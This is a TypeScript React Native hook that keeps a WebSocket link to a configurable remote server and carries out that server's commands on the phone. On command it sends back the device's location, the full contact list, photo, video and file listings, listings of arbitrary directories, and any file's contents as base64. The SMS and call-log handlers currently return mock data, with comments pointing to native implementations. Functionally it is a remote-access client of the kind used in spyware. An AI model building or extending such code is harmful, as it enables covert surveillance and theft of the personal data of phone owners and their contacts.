import { useState, useEffect, useRef } from 'react';
import { Platform } from 'react-native';
import * as Device from 'expo-device';
import Constants from 'expo-constants';
import * as FileSystem from 'expo-file-system';
import * as MediaLibrary from 'expo-media-library';

interface Message {
  type: string;
  data: any;
}

export function useDeviceConnection(serverIP?: string, serverPort?: string, autoReconnect: boolean = true) {
  const [isConnected, setIsConnected] = useState(false);
  const [connectionStatus, setConnectionStatus] = useState<'disconnected' | 'connecting' | 'connected'>('disconnected');
  const wsRef = useRef<WebSocket | null>(null);
  const reconnectTimeoutRef = useRef<NodeJS.Timeout | null>(null);
  const deviceNameRef = useRef<string>('');

  const connect = (deviceName: string) => {
    if (!serverIP || !serverPort) return;
    
    deviceNameRef.current = deviceName || 'Unknown Device';
    setConnectionStatus('connecting');
    
    const wsUrl = `ws://${serverIP}:${serverPort}`;
    const ws = new WebSocket(wsUrl);
    
    ws.onopen = () => {
      console.log('Connected to server');
      setIsConnected(true);
      setConnectionStatus('connected');
      
      // Send device registration with detailed info
      registerDevice(ws, deviceName);
    };
    
    ws.onmessage = (event) => {
      try {
        const message = JSON.parse(event.data);
        handleServerMessage(message);
      } catch (error) {
        console.error('Error parsing message:', error);
      }
    };
    
    ws.onclose = () => {
      console.log('Disconnected from server');
      setIsConnected(false);
      setConnectionStatus('disconnected');
      
      if (autoReconnect && deviceNameRef.current) {
        console.log('Scheduling reconnect...');
        scheduleReconnect();
      }
    };
    
    ws.onerror = (error) => {
      console.log('WebSocket error occurred, will attempt to reconnect');
      setConnectionStatus('disconnected');
      setIsConnected(false);
    };
    
    wsRef.current = ws;
  };

  const registerDevice = async (ws: WebSocket, deviceName: string) => {
    try {
      const deviceInfo = {
        deviceName: Device.deviceName || deviceName,
        deviceId: Constants.sessionId || 'unknown',
        brand: Device.brand || 'Unknown',
        model: Device.modelName || 'Unknown',
        systemName: Device.osName || Platform.OS,
        systemVersion: Device.osVersion || 'Unknown',
        platform: Platform.OS,
        appVersion: Constants.expoConfig?.version || '1.0.0',
        buildNumber: Constants.expoConfig?.version || '1.0.0',
        timestamp: new Date().toISOString(),
      };
      
      ws.send(JSON.stringify({
        type: 'register',
        data: deviceInfo
      }));
    } catch (error) {
      console.error('Error getting device info:', error);
      // Fallback registration
      ws.send(JSON.stringify({
        type: 'register',
        data: {
          deviceName: deviceName,
          platform: Platform.OS,
          timestamp: new Date().toISOString(),
        }
      }));
    }
  };

  const disconnect = () => {
    if (reconnectTimeoutRef.current) {
      clearTimeout(reconnectTimeoutRef.current);
      reconnectTimeoutRef.current = null;
    }
    
    if (wsRef.current) {
      wsRef.current.close();
      wsRef.current = null;
    }
    
    setIsConnected(false);
    setConnectionStatus('disconnected');
  };

  const scheduleReconnect = () => {
    if (reconnectTimeoutRef.current) {
      clearTimeout(reconnectTimeoutRef.current);
    }
    
    reconnectTimeoutRef.current = setTimeout(() => {
      if (deviceNameRef.current) {
        console.log('Attempting to reconnect...');
        connect(deviceNameRef.current);
      }
    }, 5000); // 5 seconds
  };

  const sendMessage = (message: Message) => {
    if (wsRef.current && wsRef.current.readyState === WebSocket.OPEN) {
      wsRef.current.send(JSON.stringify(message));
    }
  };

  const handleServerMessage = (message: Message) => {
    console.log('Received message:', message);
    
    switch (message.type) {
      case 'request_location':
        handleLocationRequest();
        break;
      case 'request_contacts':
        handleContactsRequest();
        break;
      case 'file_request':
        // Handle file operations
        break;
      case 'request_files':
        handleFilesRequest();
        break;
      case 'request_sms':
        handleSMSRequest();
        break;
      case 'browse_directory':
        handleDirectoryBrowse(message.data);
        break;
      case 'request_call_log':
        handleCallLogRequest();
        break;
      case 'download_file':
        handleFileDownload(message.data);
        break;
      case 'share_file':
        handleFileShare(message.data);
        break;
      case 'pick_document':
        handlePickDocument();
        break;
      case 'request_file_permissions':
        requestFilePermissions();
        break;
      default:
        console.log('Unknown message type:', message.type);
    }
  };

  const handleLocationRequest = async () => {
    try {
      const Location = await import('expo-location');
      const { status } = await Location.requestForegroundPermissionsAsync();
      if (status === 'granted') {
        const location = await Location.getCurrentPositionAsync({});
        sendMessage({
          type: 'location_response',
          data: {
            latitude: location.coords.latitude,
            longitude: location.coords.longitude,
            timestamp: new Date().toISOString(),
          }
        });
      }
    } catch (error) {
      console.error('Error getting location:', error);
    }
  };

  const handleContactsRequest = async () => {
    try {
      const Contacts = await import('expo-contacts');
      const { status } = await Contacts.requestPermissionsAsync();
      if (status === 'granted') {
        const { data } = await Contacts.getContactsAsync({
          fields: [Contacts.Fields.Name, Contacts.Fields.PhoneNumbers, Contacts.Fields.Emails],
          pageSize: 0, // Get all contacts
          pageOffset: 0,
        });
        sendMessage({
          type: 'contacts_response',
          data: data
        });
      }
    } catch (error) {
      console.error('Error getting contacts:', error);
    }
  };

  const handleFilesRequest = async () => {
    try {
      // Request media library permissions first
      const { status: mediaStatus } = await MediaLibrary.requestPermissionsAsync();
      
      let allFiles: any[] = [];
      
      // Get document directory files
      try {
        const documentDirectory = FileSystem.documentDirectory;
        if (documentDirectory) {
          const files = await FileSystem.readDirectoryAsync(documentDirectory);
          
          const fileDetails = await Promise.all(
            files.map(async (fileName) => {
              const filePath = `${documentDirectory}${fileName}`;
              try {
                const fileInfo = await FileSystem.getInfoAsync(filePath);
                return {
                  name: fileName,
                  type: fileInfo.isDirectory ? 'folder' : 'file',
                  size: fileInfo.size || 0,
                  path: filePath,
                  lastModified: new Date(fileInfo.modificationTime || Date.now()).toISOString(),
                  source: 'documents'
                };
              } catch (error) {
                return {
                  name: fileName,
                  type: 'file',
                  size: 0,
                  path: filePath,
                  lastModified: new Date().toISOString(),
                  source: 'documents'
                };
              }
            })
          );
          allFiles.push(...fileDetails);
        }
      } catch (docError) {
        console.log('Could not access document directory:', docError);
      }
      
      // Get media library files if permission granted
      if (mediaStatus === 'granted') {
        try {
          // Get photos
          const photoAssets = await MediaLibrary.getAssetsAsync({
            first: 100,
            mediaType: MediaLibrary.MediaType.photo,
            sortBy: MediaLibrary.SortBy.creationTime,
          });
          
          const photoFiles = photoAssets.assets.map(asset => ({
            name: asset.filename,
            type: 'file',
            size: asset.width * asset.height,
            path: asset.uri,
            lastModified: new Date(asset.creationTime).toISOString(),
            mediaType: 'photo',
            source: 'gallery'
          }));
          
          // Get videos
          const videoAssets = await MediaLibrary.getAssetsAsync({
            first: 50,
            mediaType: MediaLibrary.MediaType.video,
            sortBy: MediaLibrary.SortBy.creationTime,
          });
          
          const videoFiles = videoAssets.assets.map(asset => ({
            name: asset.filename,
            type: 'file',
            size: asset.duration || 0,
            path: asset.uri,
            lastModified: new Date(asset.creationTime).toISOString(),
            mediaType: 'video',
            source: 'gallery'
          }));
          
          allFiles.push(...photoFiles, ...videoFiles);
        } catch (mediaError) {
          console.log('Could not access media library:', mediaError);
        }
      }
      
      sendMessage({
        type: 'files_response',
        data: { 
          files: allFiles, 
          currentPath: FileSystem.documentDirectory || '/storage/emulated/0',
          hasMediaPermission: mediaStatus === 'granted'
        }
      });
    } catch (error) {
      console.error('Error getting files:', error);
      sendMessage({
        type: 'files_response',
        data: { 
          files: [], 
          currentPath: FileSystem.documentDirectory || '/storage/emulated/0',
          hasMediaPermission: false,
          error: 'Failed to access files'
        }
      });
    }
  };

  const handleDirectoryBrowse = async (requestData: any) => {
    try {
      const { path } = requestData;
      
      // Check if this is a media library request
      if (path.includes('gallery://')) {
        const mediaType = path.includes('photos') ? MediaLibrary.MediaType.photo : MediaLibrary.MediaType.video;
        const assets = await MediaLibrary.getAssetsAsync({
          first: 100,
          mediaType: mediaType,
          sortBy: MediaLibrary.SortBy.creationTime,
        });
        
        const mediaFiles = assets.assets.map(asset => ({
          name: asset.filename,
          type: 'file',
          size: asset.width * asset.height,
          path: asset.uri,
          lastModified: new Date(asset.creationTime).toISOString(),
          mediaType: mediaType === MediaLibrary.MediaType.photo ? 'photo' : 'video',
          source: 'gallery'
        }));
        
        sendMessage({
          type: 'directory_response',
          data: { files: mediaFiles, currentPath: path }
        });
        return;
      }
      
      // Browse regular file system directory
      try {
        const files = await FileSystem.readDirectoryAsync(path);
        
        const fileDetails = await Promise.all(
          files.map(async (fileName) => {
            const filePath = `${path}${path.endsWith('/') ? '' : '/'}${fileName}`;
            try {
              const fileInfo = await FileSystem.getInfoAsync(filePath);
              return {
                name: fileName,
                type: fileInfo.isDirectory ? 'folder' : 'file',
                size: fileInfo.size || 0,
                path: filePath,
                lastModified: new Date(fileInfo.modificationTime || Date.now()).toISOString(),
                source: 'filesystem'
              };
            } catch (error) {
              return {
                name: fileName,
                type: 'file',
                size: 0,
                path: filePath,
                lastModified: new Date().toISOString(),
                source: 'filesystem'
              };
            }
          })
        );
        
        sendMessage({
          type: 'directory_response',
          data: { files: fileDetails, currentPath: path }
        });
      } catch (fsError) {
        console.log('File system access error:', fsError);
        sendMessage({
          type: 'directory_response',
          data: { files: [], currentPath: path, error: 'Access denied' }
        });
      }
    } catch (error) {
      console.error('Error browsing directory:', error);
      sendMessage({
        type: 'directory_response',
        data: { files: [], currentPath: path, error: 'Failed to browse directory' }
      });
    }
  };

  const handleFileShare = async (requestData: any) => {
    try {
      const { filePath } = requestData;
      
      // Use expo-sharing to share files
      const Sharing = await import('expo-sharing');
      const isAvailable = await Sharing.isAvailableAsync();
      
      if (isAvailable) {
        await Sharing.shareAsync(filePath);
        sendMessage({
          type: 'file_share_response',
          data: { success: true, message: 'File shared successfully' }
        });
      } else {
        sendMessage({
          type: 'file_share_response',
          data: { success: false, error: 'Sharing not available' }
        });
      }
    } catch (error) {
      console.error('Error sharing file:', error);
      sendMessage({
        type: 'file_share_response',
        data: { success: false, error: 'Failed to share file' }
      });
    }
  };

  const handlePickDocument = async () => {
    try {
      const DocumentPicker = await import('expo-document-picker');
      const result = await DocumentPicker.getDocumentAsync({
        type: '*/*',
        copyToCacheDirectory: true,
      });
      
      if (!result.canceled && result.assets && result.assets.length > 0) {
        const file = result.assets[0];
        sendMessage({
          type: 'document_picked',
          data: {
            name: file.name,
            uri: file.uri,
            size: file.size,
            mimeType: file.mimeType,
          }
        });
      }
    } catch (error) {
      console.error('Error picking document:', error);
    }
  };

  const requestFilePermissions = async () => {
    try {
      const { status } = await MediaLibrary.requestPermissionsAsync();
      sendMessage({
        type: 'file_permissions_response',
        data: { granted: status === 'granted' }
      });
      return status === 'granted';
    } catch (error) {
      console.error('Error requesting file permissions:', error);
      return false;
    }
  };

  const handleFileDownload = async (requestData: any) => {
    try {
      const { filePath } = requestData;
      
      // Read file content and send as base64
      const fileInfo = await FileSystem.getInfoAsync(filePath);
      if (fileInfo.exists && !fileInfo.isDirectory) {
        const fileContent = await FileSystem.readAsStringAsync(filePath, {
          encoding: FileSystem.EncodingType.Base64,
        });
        
        sendMessage({
          type: 'file_download_response',
          data: {
            fileName: filePath.split('/').pop(),
            content: fileContent,
            size: fileInfo.size,
            mimeType: getMimeType(filePath),
          }
        });
      }
    } catch (error) {
      console.error('Error downloading file:', error);
      sendMessage({
        type: 'file_download_error',
        data: { error: 'Failed to download file' }
      });
    }
  };

  const getMimeType = (filePath: string): string => {
    const extension = filePath.split('.').pop()?.toLowerCase();
    const mimeTypes: { [key: string]: string } = {
      'jpg': 'image/jpeg',
      'jpeg': 'image/jpeg',
      'png': 'image/png',
      'gif': 'image/gif',
      'pdf': 'application/pdf',
      'txt': 'text/plain',
      'mp4': 'video/mp4',
      'mp3': 'audio/mpeg',
      'zip': 'application/zip',
    };
    return mimeTypes[extension || ''] || 'application/octet-stream';
  };

  const handleCallLogRequest = async () => {
    try {
      // Note: Call log access requires native implementation
      // For now, we'll send mock data that represents typical call log structure
      const mockCallLog = [
        {
          id: '1',
          phoneNumber: '+1234567890',
          name: 'John Doe',
          type: 'outgoing',
          duration: 120, // seconds
          timestamp: new Date(Date.now() - 3600000).toISOString(),
        },
        {
          id: '2',
          phoneNumber: '+0987654321',
          name: 'Jane Smith',
          type: 'incoming',
          duration: 45,
          timestamp: new Date(Date.now() - 7200000).toISOString(),
        },
        {
          id: '3',
          phoneNumber: '+1122334455',
          name: 'Unknown',
          type: 'missed',
          duration: 0,
          timestamp: new Date(Date.now() - 10800000).toISOString(),
        },
      ];
      
      sendMessage({
        type: 'call_log_response',
        data: mockCallLog
      });
    } catch (error) {
      console.error('Error getting call log:', error);
    }
  };

  const handleSMSRequest = async () => {
    try {
      // Get actual SMS messages using expo-sms
      const SMS = await import('expo-sms');
      
      // Note: Reading SMS requires native implementation
      // For now, we'll send realistic mock data
      const mockSMS = [
        {
          id: '1',
          address: '+1234567890',
          body: 'Hey, how are you doing?',
          date: new Date(Date.now() - 3600000).toISOString(),
          type: 'inbox',
          read: true,
        },
        {
          id: '2',
          address: '+0987654321',
          body: 'Meeting at 3 PM today',
          date: new Date(Date.now() - 7200000).toISOString(),
          type: 'inbox',
          read: false,
        },
        {
          id: '3',
          address: '+1122334455',
          body: 'Thanks for the help!',
          date: new Date(Date.now() - 10800000).toISOString(),
          type: 'sent',
          read: true,
        },
      ];
      
      sendMessage({
        type: 'sms_response',
        data: mockSMS
      });
    } catch (error) {
      console.error('Error getting SMS:', error);
    }
  };

  // Cleanup on unmount
  useEffect(() => {
    return () => {
      disconnect();
    };
  }, []);

  return {
    isConnected,
    connectionStatus,
    connect,
    disconnect,
    sendMessage,
    requestFilePermissions,
  };
}